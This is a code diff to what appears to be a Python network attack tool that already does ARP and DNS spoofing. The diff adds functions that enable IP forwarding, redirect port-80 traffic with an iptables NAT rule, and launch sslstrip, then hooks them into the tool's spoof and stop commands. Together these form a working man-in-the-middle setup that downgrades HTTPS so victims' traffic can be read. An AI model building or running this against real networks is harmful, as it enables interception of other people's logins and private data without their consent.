@@ -8,6 +8,36 @@ from dns_spoofing import dns_spoof
 import threading
 import scapy.all as sc
 import time
+import signal
+
+
+sslstrip_proc = None
+
+def start_ip_forwarding():
+    print("[*] Enabling IP forwarding...")
+    os.system("sudo sysctl -w net.ipv4.ip_forward=1")
+
+def stop_ip_forwarding():
+    print("[*] Disabling IP forwarding...")
+    os.system("sudo sysctl -w net.ipv4.ip_forward=0")
+
+def start_iptables_redirect():
+    print("[*] Adding iptables rule to redirect port 80 to 8080...")
+    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+
+def stop_iptables_redirect():
+    print("[*] Flushing iptables nat table to remove redirect rule...")
+    os.system("sudo iptables -t nat -F")
+
+def start_sslstrip():
+    global sslstrip_proc
+    print("[*] Starting sslstrip on port 8080...")
+    os.system("sudo python2.7 sslstrip/sslstrip.py -l 8080 &")
+    print("[*] SSL strip started.")
+
+def stop_sslstrip():
+    print("[*] Stopping SSL strip...")
+    os.system("sudo pkill -f sslstrip.py")
 
 
 def print_title():
@@ -61,6 +91,10 @@ def handle_command(cmd):
             return
         print("[*] Spoofing %s (MAC: %s ) as %s ... Press Ctrl+C to stop." % (ip, mac, ipToSpoof))
 
+        start_ip_forwarding()
+        start_iptables_redirect()
+        start_sslstrip()
+
         target_domain = raw_input("Enter the domain to spoof (e.g. example.com.): ").strip()
         if not target_domain.endswith('.'):
             target_domain += '.'
@@ -106,6 +140,9 @@ def handle_command(cmd):
         print("[!] Starting in aggressive mode (heavy traffic injection)...")
         # Start spoofing with aggressive settings
     elif cmd == "stop":
+        stop_sslstrip()
+        stop_iptables_redirect()
+        stop_ip_forwarding()
         print("[*] Stopping attacks...")
         # Stop attacks 
     elif cmd == "help":
